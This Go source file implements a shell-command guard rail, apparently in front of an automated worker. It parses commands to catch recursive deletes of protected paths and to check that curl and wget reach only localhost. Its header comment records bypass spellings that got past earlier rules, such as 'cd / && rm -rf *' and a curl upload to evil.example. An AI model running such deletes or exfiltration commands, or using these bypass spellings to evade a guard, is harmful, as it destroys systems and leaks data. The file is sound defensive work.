package safety

// The rules in safety.go read a command as text, so each review found a new spelling of the same command that got
// past them (round-5 recheck: "timeout 5 rm -rf /etc", "rm -rf ~/..", "cd / && rm -rf *", and "curl -d @x
// http://localhost:1 evil.example" taken as local because one of its two targets was). This file reads a command the
// way the shell splits it: simple commands, unquoted words, a "bash -c" script as commands of its own, "cd" moving
// where relative paths point. It is still a guard rail in front of the worker, not the approval gate.

import (
	"net/url"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
)

// shellCommands splits a shell text into its simple commands, each as its unquoted words (splitCommands).
func shellCommands(text string) [][]string {
	var out [][]string
	for _, c := range splitCommands(text) {
		out = append(out, c.words)
	}
	return out
}

// simpleCommand is one simple command of a shell text: its unquoted words, and whether a pipe feeds it.
type simpleCommand struct {
	words []string
	piped bool
}

// splitCommands splits a shell text into its simple commands, each as its unquoted words. Operators (; & | ( ) and a
// newline) end a command, and a substitution ("$(...)", a backquoted one) is a command of its own; its opening is kept
// at the end of the word it stood in, so that word reads as decided at run time ("rm -rf $(pwd)" keeps an operand,
// "$(", and does not lose it), and the command it stood in goes on after it. An unclosed quote runs to the end of the
// text, as one word.
func splitCommands(text string) []simpleCommand {
	var commands []simpleCommand
	var current []string
	var word strings.Builder
	inWord, piped, inBackquote := false, false, false
	endWord := func() {
		if inWord {
			current = append(current, word.String())
			word.Reset()
			inWord = false
		}
	}
	endCommand := func() {
		endWord()
		if len(current) > 0 {
			commands = append(commands, simpleCommand{words: current, piped: piped})
		}
		current = nil
	}
	// opens are the parentheses and substitutions not yet closed, innermost last. A substitution keeps the command it
	// stands in, which goes on after it closes ("find $(x) -delete" is one find, with its -delete).
	type opened struct {
		words        []string
		piped        bool
		substitution bool
	}
	var opens []opened
	openSubstitution := func(mark string) {
		word.WriteString(mark)
		inWord = true
		endWord()
		opens = append(opens, opened{words: current, piped: piped, substitution: true})
		current, piped = nil, false
	}
	closeParen := func() {
		endCommand()
		piped = false
		if n := len(opens); n > 0 {
			if o := opens[n-1]; o.substitution {
				current, piped = o.words, o.piped
			}
			opens = opens[:n-1]
		}
	}
	rs := []rune(text)
	for i := 0; i < len(rs); i++ {
		c := rs[i]
		switch {
		case c == '\\':
			if i+1 < len(rs) {
				i++
				if rs[i] != '\n' {
					word.WriteRune(rs[i])
					inWord = true
				}
			}
		case c == '\'':
			inWord = true
			for i++; i < len(rs) && rs[i] != '\''; i++ {
				word.WriteRune(rs[i])
			}
		case c == '"':
			inWord = true
			for i++; i < len(rs) && rs[i] != '"'; i++ {
				if rs[i] == '\\' && i+1 < len(rs) && strings.ContainsRune("$`\"\\\n", rs[i+1]) {
					i++
				}
				word.WriteRune(rs[i])
			}
		case c == '#' && !inWord:
			for i < len(rs) && rs[i] != '\n' {
				i++
			}
			endCommand()
		case c == ' ' || c == '\t' || c == '\r':
			endWord()
		case c == '`' && !inBackquote:
			inBackquote = true
			openSubstitution("`")
		case c == '`':
			inBackquote = false
			closeParen()
		case c == '$' && i+1 < len(rs) && rs[i+1] == '(':
			openSubstitution("$(")
			i++
		case c == '(':
			endCommand()
			opens = append(opens, opened{})
			piped = false
		case c == ')':
			closeParen()
		case strings.ContainsRune(";&|\n", c):
			endCommand()
			switch {
			case c == '&' && i > 0 && rs[i-1] == '|':
				// "|&" pipes, as "|" does.
			case c == '|':
				piped = (i+1 >= len(rs) || rs[i+1] != '|') && (i == 0 || rs[i-1] != '|')
			default:
				piped = false
			}
		default:
			word.WriteRune(c)
			inWord = true
		}
	}
	// A substitution left open at the end still leaves the command it stood in.
	for len(opens) > 0 {
		closeParen()
	}
	endCommand()
	return commands
}

// homeDir is the home the worker's commands run in.
func homeDir() string {
	if h := os.Getenv("HOME"); strings.HasPrefix(h, "/") {
		return path.Clean(h)
	}
	return "/home/headless"
}

var (
	homeWordRe  = regexp.MustCompile(`^(\$\{HOME\}|\$HOME|~)(/|$)`)
	otherHomeRe = regexp.MustCompile(`^~([a-z_][a-z0-9_-]*)(/|$)`)
	globRe      = regexp.MustCompile(`[*?\[]`)
	userHomeRe  = regexp.MustCompile(`^/home/[^/]+$|^/(usr|var|etc)/[^/]+$`)
)

// systemDirs are the top-level folders whose loss breaks the machine.
var systemDirs = map[string]bool{"/": true, "/bin": true, "/boot": true, "/dev": true, "/etc": true, "/home": true,
	"/lib": true, "/lib32": true, "/lib64": true, "/libx32": true, "/media": true, "/mnt": true, "/opt": true,
	"/proc": true, "/root": true, "/run": true, "/sbin": true, "/srv": true, "/sys": true, "/usr": true, "/var": true}

// runTimeDir is the folder a command runs in after a cd to a folder decided at run time ("cd $X", "cd -"): unknown,
// so a relative path from it names nothing that can be read.
const runTimeDir = "$"

// resolveWord is the absolute path a word names from cwd, or "" when it is decided at run time (by the word, or by a
// cwd of runTimeDir).
func resolveWord(word, cwd, home string) string {
	p := homeWordRe.ReplaceAllString(word, home+"$2")
	if strings.HasPrefix(p, "~root") && (len(p) == 5 || p[5] == '/') {
		p = "/root" + p[5:]
	}
	p = otherHomeRe.ReplaceAllString(p, "/home/$1$2")
	if strings.ContainsAny(p, "$`") || strings.HasPrefix(p, "~") || cwd == runTimeDir && !strings.HasPrefix(p, "/") {
		return ""
	}
	if cwd == "" && !strings.HasPrefix(p, "/") {
		// The caller did not say where the command starts: only a relative path that climbs out of it ("..",
		// "../..") is read, as climbing from a folder inside the home.
		p = path.Join(home, "work", p)
	} else if !strings.HasPrefix(p, "/") {
		p = path.Join(cwd, p)
	}
	return path.Clean("/" + p)
}

// protectedPath reports whether deleting a resolved path (or all a glob in it matches) wipes the root, a system
// folder, a home or the worker's home.
func protectedPath(p, home string) bool {
	parts := strings.Split(p, "/")
	for i, part := range parts {
		if globRe.MatchString(part) {
			parent := strings.Join(parts[:i], "/")
			if parent == "" {
				parent = "/"
			}
			return protectedPath(parent, home)
		}
	}
	if systemDirs[p] || p == home || strings.HasPrefix(home, strings.TrimSuffix(p, "/")+"/") {
		return true
	}
	return userHomeRe.MatchString(p)
}

// runTimeName reports whether what a path word names is decided at run time: after its last variable, substitution
// or "~" form resolveWord cannot read, no literal name follows ("$X", "$(pwd)", "$D/*", "$D/..", "~+"), and a variable
// can hold "/", ".." or nothing. "$TMPDIR/x" names x, and is read as that.
func runTimeName(w string) bool {
	if strings.HasPrefix(w, "~") {
		w = "$" + w[1:]
	}
	if !strings.ContainsAny(w, "$`") {
		return false
	}
	i := strings.LastIndexAny(w, "$`)}")
	tail := w[i+1:]
	if w[i] == '$' {
		n := 0
		for n < len(tail) && (tail[n] == '_' || tail[n] >= 'a' && tail[n] <= 'z' || tail[n] >= 'A' && tail[n] <= 'Z' ||
			tail[n] >= '0' && tail[n] <= '9') {
			n++
		}
		if n == 0 && tail != "" && strings.IndexByte("@*#?$!-", tail[0]) >= 0 {
			n = 1
		}
		tail = tail[n:]
	}
	if !strings.HasPrefix(tail, "/") {
		return true
	}
	tail = strings.TrimRight(tail, "/")
	last := tail[strings.LastIndexByte(tail, '/')+1:]
	return last == "" || last == "." || last == ".." || globRe.MatchString(last)
}

// The reasons a recursive delete waits.
const (
	wipeReason    = "it recursively deletes a home, a system folder or the root directory"
	runTimeReason = "it recursively deletes a path decided at run time (a variable, a substitution, or a relative path after a cd to such a folder), which cannot be checked before it runs"
)

// deleteConcern is why recursively deleting what a path word names, from cwd, waits, or "": it resolves to a protected
// path, or what it names is decided at run time (follow-up O-1.a.5): a run-time name (runTimeName), or any path that
// is not absolute from a folder decided at run time (runTimeDir).
func deleteConcern(w, cwd, home string) string {
	if p := resolveWord(w, cwd, home); p != "" {
		if protectedPath(p, home) {
			return wipeReason
		}
		return ""
	}
	if runTimeName(w) || cwd == runTimeDir && !strings.HasPrefix(w, "/") && !homeWordRe.MatchString(w) {
		return runTimeReason
	}
	return ""
}

// rmOperands reads the rm at words[at]: whether it deletes recursively, and the paths it is given.
func rmOperands(words []string, at int) (recursive bool, operands []string) {
	done := false
	for _, w := range words[at+1:] {
		switch {
		case !done && w == "--":
			done = true
		case !done && strings.HasPrefix(w, "--") && len(w) > 2:
			name := strings.SplitN(w, "=", 2)[0]
			recursive = recursive || strings.HasPrefix("--recursive", name)
		case !done && strings.HasPrefix(w, "-") && len(w) > 1:
			recursive = recursive || strings.ContainsAny(w, "rR")
		default:
			operands = append(operands, w)
		}
	}
	return recursive, operands
}

// findStarts reads the find at words[at]: the folders it starts from (the current one when it names none), and
// whether it deletes what it finds (-delete, or -exec/-execdir with rm, unlink or shred, as the find rule in safety.go
// reads it).
func findStarts(words []string, at int) (starts []string, deletes bool) {
	i := at + 1
	for i < len(words) && (words[i] == "-H" || words[i] == "-L" || words[i] == "-P") {
		i++
	}
	for ; i < len(words) && !strings.HasPrefix(words[i], "-") && words[i] != "(" && words[i] != "!"; i++ {
		starts = append(starts, words[i])
	}
	if len(starts) == 0 {
		starts = []string{"."}
	}
	for ; i < len(words); i++ {
		switch words[i] {
		case "-delete":
			deletes = true
		case "-exec", "-execdir":
			if i+1 < len(words) {
				switch path.Base(words[i+1]) {
				case "rm", "unlink", "shred":
					deletes = true
				}
			}
		}
	}
	return starts, deletes
}

// recursiveDeleteConcern is why the rm or find at words[at] waits (deleteConcern of each path it deletes under), or "".
func recursiveDeleteConcern(words []string, at int, cwd, home string) string {
	var paths []string
	switch path.Base(words[at]) {
	case "rm":
		recursive, operands := rmOperands(words, at)
		if !recursive {
			return ""
		}
		paths = operands
	case "find":
		starts, deletes := findStarts(words, at)
		if !deletes {
			return ""
		}
		paths = starts
	}
	for _, w := range paths {
		if why := deleteConcern(w, cwd, home); why != "" {
			return why
		}
	}
	return ""
}

var shellNames = map[string]bool{"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "mksh": true,
	"ash": true, "busybox": true, "su": true}
var assignRe = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)
var dashCRe = regexp.MustCompile(`^-[a-zA-Z]*c[a-zA-Z]*$`)

// startDir is the folder a command starts in, as resolveWord reads it: dir (the caller's working folder) made
// absolute, or "" when the caller did not say. A relative dir is where the caller's process runs it from.
func startDir(dir, home string) string {
	dir = strings.TrimSpace(dir)
	if dir == "" {
		return ""
	}
	if !strings.HasPrefix(dir, "/") && !homeWordRe.MatchString(dir) {
		wd, err := os.Getwd()
		if err != nil {
			return ""
		}
		dir = path.Join(filepath.ToSlash(wd), dir)
	}
	return resolveWord(dir, "/", home)
}

// cdDir is the folder a cd moves to from cwd, or runTimeDir when that folder is decided at run time ("cd $X",
// "cd -").
func cdDir(words []string, cwd, home string) string {
	target := "~"
	for _, w := range words[1:] {
		if w == "-" || w != "--" && !strings.HasPrefix(w, "-") {
			target = w
			break
		}
	}
	if target == "-" {
		return runTimeDir
	}
	if p := resolveWord(target, cwd, home); p != "" {
		return p
	}
	return runTimeDir
}

// eachCommand is the word reader wipeConcern and the program rules share. It calls visit with each simple command of
// a shell text (its leading assignments dropped) and the folder it runs in: cwd, then every cd before it. A shell's
// -c script ("bash -c '...'", behind any wrapper) is read as commands of its own; here-documents fed to a program
// other than a shell are its data and are not read. visit's first concern ends the walk.
func eachCommand(command, cwd string, depth int, visit func(c simpleCommand, cwd string) *Concern) *Concern {
	if depth > 4 {
		return &Concern{Reason: "it nests shells too deeply to be checked before it runs"}
	}
	home := homeDir()
	for _, c := range splitCommands(blankHeredocs(command)) {
		words := c.words
		for len(words) > 0 && assignRe.MatchString(words[0]) {
			words = words[1:]
		}
		if len(words) == 0 {
			continue
		}
		if words[0] == "cd" {
			cwd = cdDir(words, cwd, home)
			continue
		}
		if r := visit(simpleCommand{words: words, piped: c.piped}, cwd); r != nil {
			return r
		}
		for i, w := range words {
			if !shellNames[path.Base(w)] {
				continue
			}
			for j := i + 1; j+1 < len(words); j++ {
				if dashCRe.MatchString(words[j]) {
					if r := eachCommand(words[j+1], cwd, depth+1, visit); r != nil {
						return r
					}
					break
				}
			}
		}
	}
	return nil
}

// wipeConcern reads a command word by word for a recursive delete of the root, a system folder or a home, or of a
// path decided at run time: rm or find named by any path, behind any wrapper (every word is read, so env, nohup,
// timeout 5, sudo, command... need no list here), inside a "bash -c" script, or on a relative path, read from cwd (the
// folder the command starts in; "" when not known) and every "cd" after it (eachCommand).
func wipeConcern(command, cwd string, depth int) *Concern {
	home := homeDir()
	return eachCommand(command, cwd, depth, func(c simpleCommand, cwd string) *Concern {
		for i, w := range c.words {
			if name := path.Base(w); name == "rm" || name == "find" {
				if why := recursiveDeleteConcern(c.words, i, cwd, home); why != "" {
					return &Concern{Reason: why}
				}
			}
		}
		return nil
	})
}

// wrapperPrograms are the wrappers wipeConcern's examples read a delete behind (sudo, env, nohup, timeout 5,
// command): each runs the program named after its own options. The program rules skip them to the command word.
var wrapperPrograms = map[string]bool{"sudo": true, "env": true, "nohup": true, "timeout": true, "command": true}

// durationRe is the duration timeout takes before the program it runs.
var durationRe = regexp.MustCompile(`^[0-9.]+[smhd]?$`)

// commandWords lists where the program of a simple command (its leading assignments dropped) may stand: its first
// word, and, behind a wrapper (wrapperPrograms), the word after the wrapper's options, assignments and timeout's
// duration. A word right after one of the wrapper's options may be that option's value ("sudo -u root ..."), so both
// it and the word after it are listed. "command -v x" only names x, and lists nothing behind it.
func commandWords(words []string) []int {
	var at []int
	for i := 0; i < len(words); {
		at = append(at, i)
		name := path.Base(words[i])
		if !wrapperPrograms[name] {
			return at
		}
		duration, maybeValue := name == "timeout", false
		i++
	scan:
		for ; i < len(words); i++ {
			w := words[i]
			switch {
			case name == "command" && (w == "-v" || w == "-V"):
				return at
			case w == "--":
				maybeValue = false
			case len(w) > 1 && w[0] == '-':
				maybeValue = !strings.Contains(w, "=")
			case assignRe.MatchString(w):
				maybeValue = false
			case duration && durationRe.MatchString(w):
				duration, maybeValue = false, false
			case maybeValue && !wrapperPrograms[path.Base(w)]:
				at = append(at, i)
				maybeValue = false
			default:
				break scan
			}
		}
	}
	return at
}

// plainWord is a word as the program rules read it: a word holding a space, a quote, an operator or a substitution
// came from quotes (or is decided at run time) and is one argument, read as an empty pair of quotes, as blankQuoted
// reads it.
func plainWord(w string) string {
	if strings.ContainsAny(w, " \t\n;&|()<>'\"$`\\") {
		return "''"
	}
	return w
}

// programLines is each program a command runs, one line each: the base name of its command word (commandWords) and
// its arguments (plainWord), with "| " before one a pipe feeds. The program rules are matched on these lines as well
// as on the command's text, so a program named by its absolute path or behind a wrapper is read as itself (follow-up
// O-1.a.1). A program word decided at run time ("$c") is kept as it is.
func programLines(command string) string {
	var b strings.Builder
	eachCommand(command, "", 0, func(c simpleCommand, _ string) *Concern {
		for _, at := range commandWords(c.words) {
			if c.piped {
				b.WriteString("| ")
			}
			program := c.words[at]
			switch {
			case strings.ContainsAny(program, "$`"):
			case strings.ContainsAny(program, " \t\n;&|()<>'\"\\"):
				program = "''"
			default:
				program = path.Base(program)
			}
			b.WriteString(program)
			for _, w := range c.words[at+1:] {
				b.WriteByte(' ')
				b.WriteString(plainWord(w))
			}
			b.WriteByte('\n')
		}
		return nil
	})
	return b.String()
}

// Options of curl and wget that take a value. A value given to an option not listed is read as a target if it looks
// like one: an unknown option fails closed, never open.
var curlValueShort = "AbcCdDeEFHKmoPQrtTuUwxXyYz"
var curlValueLong = map[string]bool{"data": true, "data-raw": true, "data-binary": true, "data-ascii": true,
	"data-urlencode": true, "json": true, "form": true, "form-string": true, "header": true, "request": true,
	"output": true, "user": true, "user-agent": true, "referer": true, "cookie": true, "cookie-jar": true,
	"upload-file": true, "write-out": true, "max-time": true, "connect-timeout": true, "retry": true,
	"retry-delay": true, "retry-max-time": true, "cacert": true, "capath": true, "cert": true, "key": true,
	"cert-type": true, "key-type": true, "pass": true, "range": true, "continue-at": true, "dump-header": true,
	"limit-rate": true, "max-filesize": true, "time-cond": true, "proxy-user": true, "oauth2-bearer": true,
	"aws-sigv4": true, "variable": true, "expect100-timeout": true, "keepalive-time": true, "interface": true,
	"local-port": true, "output-dir": true, "trace": true, "trace-ascii": true, "stderr": true, "ciphers": true,
	"tls-max": true, "unix-socket": true, "abstract-unix-socket": true, "hostpubmd5": true, "pinnedpubkey": true,
	"crlfile": true, "netrc-file": true, "service-name": true, "mail-from": true, "mail-rcpt": true,
	"mail-auth": true}

// Options whose value is where the request goes, or that send it somewhere the command does not name.
var curlRouteLong = map[string]bool{"url": true, "proxy": true, "preproxy": true, "socks4": true, "socks4a": true,
	"socks5": true, "socks5-hostname": true, "connect-to": true, "resolve": true, "config": true, "doh-url": true,
	"proxy1.0": true}
var wgetValueLong = map[string]bool{"post-data": true, "post-file": true, "body-data": true, "body-file": true,
	"method": true, "header": true, "output-document": true, "output-file": true, "append-output": true,
	"user": true, "password": true, "http-user": true, "http-password": true, "user-agent": true, "referer": true,
	"load-cookies": true, "save-cookies": true, "directory-prefix": true, "tries": true, "timeout": true,
	"wait": true, "level": true, "accept": true, "reject": true, "ca-certificate": true, "certificate": true,
	"private-key": true}
var wgetValueShort = "OoaDPtTwlARU"
var wgetRouteLong = map[string]bool{"input-file": true, "base": true, "execute": true, "config": true}
var wgetRouteShort = "iBe"

// localHosts are the names of this machine itself that a target may give as its host.
var localHosts = map[string]bool{"localhost": true, "127.0.0.1": true, "0.0.0.0": true, "::1": true}

// localTarget reports whether a curl or wget target is this machine, judged by the host net/url reads from it
// (Hostname: the authority without its user-info part or port), never by a pattern over the raw text (follow-up
// O-1.a.4). A target with no scheme is read as http's, as curl and wget read it. A target net/url cannot read as a
// URL with a host is not local, and neither is one decided at run time (a variable or a substitution in it).
func localTarget(target string) bool {
	if strings.ContainsAny(target, "$`") {
		return false // decided at run time (follow-up O-1.a.5): a person reads where it goes
	}
	raw := target
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil || u.Opaque != "" || u.Host == "" {
		return false
	}
	return localHosts[strings.ToLower(u.Hostname())]
}

// proxyRe finds a proxy or a config file named in a command or the environment: either can send a request somewhere
// other than the target it names.
var proxyRe = regexp.MustCompile(`(?i)proxy|curlrc|wgetrc|CURL_HOME|WGETRC|XDG_CONFIG_HOME|\.netrc`)

// onlyLocalTargets reports whether every curl and wget in a command sends only to this machine: each target is a
// local address, no proxy or config file is named, none is set in this process's environment, and no curl or wget
// config file in the home adds one. Anything it cannot read is not local.
func onlyLocalTargets(command string) bool {
	if proxyRe.MatchString(command) {
		return false
	}
	for _, kv := range os.Environ() {
		name, value, _ := strings.Cut(kv, "=")
		if value != "" && proxyRe.MatchString(name) && !strings.EqualFold(name, "no_proxy") {
			return false
		}
	}
	home := homeDir()
	for _, f := range []string{".curlrc", ".config/curlrc", ".wgetrc", ".netrc"} {
		if _, err := os.Stat(path.Join(home, f)); err == nil {
			return false
		}
	}
	seen := false
	for _, words := range shellCommands(blankHeredocs(command)) {
		for i, w := range words {
			name := path.Base(w)
			if name != "curl" && name != "wget" {
				continue
			}
			targets, ok := requestTargets(words[i+1:], name == "curl")
			if !ok {
				return false
			}
			for _, t := range targets {
				if !localTarget(t) {
					return false
				}
				seen = true
			}
		}
	}
	return seen
}

// requestTargets lists where a curl or wget's words send it; ok is false when an option routes it somewhere else or
// reads where to go from a file.
func requestTargets(words []string, curl bool) (targets []string, ok bool) {
	valueShort, valueLong, routeLong, routeShort := curlValueShort, curlValueLong, curlRouteLong, "x"
	if !curl {
		valueShort, valueLong, routeLong, routeShort = wgetValueShort, wgetValueLong, wgetRouteLong, wgetRouteShort
	}
	done := false
	for i := 0; i < len(words); i++ {
		w := words[i]
		switch {
		case done || !strings.HasPrefix(w, "-") || w == "-":
			targets = append(targets, w)
		case w == "--":
			done = true
		case strings.HasPrefix(w, "--"):
			name, value, hasValue := strings.Cut(w[2:], "=")
			if routeLong[name] {
				if name == "url" || name == "proxy" {
					if !hasValue && i+1 < len(words) {
						i++
						value = words[i]
					}
					targets = append(targets, value)
					continue
				}
				return nil, false
			}
			if hasValue || valueLong[name] {
				if !hasValue {
					i++
				}
				continue
			}
			// An option not known to take a value: if the next word looks like a target it is read as one.
		default:
			for k := 1; k < len(w); k++ {
				c := w[k]
				if strings.IndexByte(routeShort, c) >= 0 {
					if curl {
						value := w[k+1:]
						if value == "" && i+1 < len(words) {
							i++
							value = words[i]
						}
						targets = append(targets, value)
						break
					}
					return nil, false
				}
				if c == 'K' && curl {
					return nil, false
				}
				if strings.IndexByte(valueShort, c) >= 0 {
					if k == len(w)-1 {
						i++
					}
					break
				}
			}
		}
	}
	// Every other word is a target the program will try, whether or not it looks like an address.
	var out []string
	for _, t := range targets {
		if t != "" {
			out = append(out, t)
		}
	}
	return out, true
}
